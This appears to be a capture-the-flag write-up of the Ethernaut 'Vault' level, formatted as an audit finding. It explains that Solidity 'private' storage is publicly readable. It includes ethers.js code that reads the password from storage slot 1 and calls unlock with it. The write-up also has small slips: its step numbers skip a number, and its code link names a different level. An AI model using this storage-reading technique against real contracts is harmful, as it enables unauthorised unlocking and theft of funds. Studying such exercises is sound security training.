#### Unlock the vault to pass the level!

## Summary
The `Vault` contract is locked by a `bytes32 private password`. However, in Solidity, `private` variables are not actually private and can be read by anyone on the blockchain. Therefore, opening attack vectors.

```solidity
contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }
}
```

## Vulnerability Detail
An attacker could easily view the actual `password` which is supposed to be a secret. Then, they can unlock the Vault.

Attack scenario:
1. Attacker uses `ethers` to find the actual `password` value:
```javascript
const provider = new ethers.providers.InfuraProvider('NETWORK_NAME', 'INFURA_PROJECT_ID');
// Get the value of storage slot 1 (the password variable)
let password = await provider.getStorageAt(contract.address, 1);
```
3. The attacker now has the password value. They call the `unlock` function of the contract:
```javascript
await contract.locked(); // true (before `unlock`)
await contract.unlock(password);
await contract.locked(); // false (the attacker just unlocked the contract)
```

## Impact
High. An attacker can unlock the `Vault` and do whatever they want to with it.

## Code Snippet
https://github.com/danielvichinyan/ethernaut-solutions/blob/main/force/Force.sol#L4-L10

## Tools Used
Remix IDE, Manual Review

## Recommendation
Avoid storing sensitive variables just by themselves. 
Use hashing or zero-knowledge proofs.
